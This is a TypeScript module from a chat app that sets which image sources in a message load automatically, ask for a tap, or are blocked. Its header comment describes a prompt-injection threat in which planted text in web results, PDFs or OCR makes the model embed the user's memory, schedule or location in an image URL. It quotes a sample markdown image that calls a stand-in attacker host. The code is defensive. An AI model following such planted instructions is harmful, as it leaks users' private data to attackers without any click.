/**
 * Which image sources in a chat message the phone may load without a tap.
 *
 * A reply can carry text an attacker planted (a web result, an uploaded PDF,
 * a photo's OCR) telling the model to put the user's memory, schedule or
 * location into an image URL: `![](https://attacker/p.png?d=…)`. The query,
 * path or host carries the data, so loading such an image is a zero-click
 * leak, not just IP/UA exposure. Only these load by themselves:
 *  - the Recall API's own origin, the one the app already talks to (every
 *    picture the server adds is an attachment there: photo lookups, answer
 *    photos, generated images, the user's uploads);
 *  - inline raster `data:` images and local `blob:` URIs (no network).
 *
 * Any other `https:` image is "ask": a placeholder names its host and loads
 * only on tap. `http:`, `file:`, `content:`, SVG data, relative paths and
 * every other scheme are blocked. The server also turns model-written images
 * into links before saving a reply (`apps/api/app/modules/chat/untrusted_media.py`);
 * this covers the reply while it streams and older saved rows.
 */
import { getApiUrl } from "@/lib/config";
import { isInlineRasterDataUrl } from "@/lib/images/inlineRaster";

type ImageLoadPolicy = "load" | "ask" | "block";

function apiOrigin(): string | null {
  try {
    return new URL(getApiUrl()).origin;
  } catch {
    return null;
  }
}

function parse(src: string | undefined | null): URL | null {
  if (!src || typeof src !== "string") return null;
  const trimmed = src.trim();
  if (!trimmed) return null;
  try {
    // Bare relative paths throw here: they are not image sources in a message.
    return new URL(trimmed);
  } catch {
    return null;
  }
}

export function imageLoadPolicy(src: string | undefined | null): ImageLoadPolicy {
  const url = parse(src);
  if (!url) return "block";
  if (url.protocol === "blob:") return "load";
  if (url.protocol === "data:") return isInlineRasterDataUrl(url.href) ? "load" : "block";
  if (url.username || url.password) return "block";
  // The API's own origin, whatever its scheme (a dev server is plain http).
  if (url.origin === apiOrigin()) return "load";
  return url.protocol === "https:" ? "ask" : "block";
}

/** The host a tap-to-load placeholder names (punycode, so look-alikes show as such). */
export function imageHost(src: string | undefined | null): string {
  return parse(src)?.hostname ?? "";
}
